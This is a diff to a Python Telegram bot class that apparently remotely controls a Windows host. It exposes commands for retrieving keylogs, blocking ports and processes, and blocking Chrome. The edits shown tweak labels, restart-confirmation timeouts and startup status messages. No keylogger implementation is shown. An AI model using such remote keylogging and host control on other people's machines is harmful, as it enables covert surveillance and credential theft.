@@ -738,7 +738,7 @@ class PeppinoTelegram:
             Command("cantopenmenu", self.cantopenmenu, "Show blocked processes.", "cant_open", "📋 Cantopenmenu"),
 
             # 🧠 Keylogger
-            Command("keylogger", self.get_keylog, "Sends the current keylog file.", "keylogger", "⌨️ Keylogger"),
+            Command("keylogger", self.get_keylog, "Sends the current keylog file.", "keylogger", "⌨️ Retreive Keylogs"),
 
             # 🕵️‍♂️ MITM
             Command("block_port", self.block_port, "Block a specific TCP/UDP port.", "mitm", "🚫 Block Port"),
@@ -881,15 +881,18 @@ class PeppinoTelegram:
                 "Likely cause: insufficient privileges."
             )
 
-    def ask_yesno(self, custom_message: str = "Confirm action") -> bool:
+    def ask_yesno(self, custom_message: str = "Confirm action", default_if_timeout: bool = False, timeout: int = 30) -> bool:
         resp = self.send_buttons_input(
             title=custom_message,
             options={
                 "y":"✅ Yes",
                 "n":"❌ No"
-            }
+            }, timeout=timeout
         )
-        return resp.lower() == "y"
+        if resp is None:
+            return default_if_timeout
+        else:
+            return resp.lower() == "y"
     
     #@requires_admin
     def block_chrome(self, timeout: int) -> None:
@@ -1214,7 +1217,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
             if remaining <= 0:
                 self.restart(
-                    confirm=False,
+                    confirm=True,
                     verbose=True,
                     custom_message="🔄 Restarting: messages timed out."
                 )
@@ -2437,7 +2440,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
 
     def restart(self, confirm=True, verbose=True, custom_message: str|None=None) -> None:
-        doit = True if not confirm else self.ask_yesno()
+        doit = True if not confirm else self.ask_yesno(default_if_timeout=True, timeout=120, custom_message="I'm restarting, is it ok with you?")
         if not doit:
             self.operation_canceled()
             return
@@ -3229,7 +3232,10 @@ The bot is now restarting. Please wait a moment...
         STARTING_LOG_MESSAGE.edit("🔄 GOT UPDATES")
 
         self.images = load_images()
-        STARTING_LOG_MESSAGE.edit("🖼️ GOT IMAGES")
+        if self.images:
+            STARTING_LOG_MESSAGE.edit("🖼️ GOT IMAGES")
+        else:
+            STARTING_LOG_MESSAGE.edit("🚫🖼️ IMAGES ERROR")
 
         self.update_commands()
         STARTING_LOG_MESSAGE.edit("⚙️ GOT COMMANDS")
@@ -3238,7 +3244,11 @@ The bot is now restarting. Please wait a moment...
         self.nomemes = list(filter(lambda x: x.startswith("jmp"), nomemes))
 
         self.audios = load_audios()
-        STARTING_LOG_MESSAGE.edit("🎵 AUDIOS LOADED")
+        if self.audios:
+            STARTING_LOG_MESSAGE.edit("🎵 AUDIOS LOADED")
+        else:
+            STARTING_LOG_MESSAGE.edit("🚫️🎵 AUDIOS ERROR")
+
 
         curr_wallpaper_path = get_current_wallpaper()
         if curr_wallpaper_path:
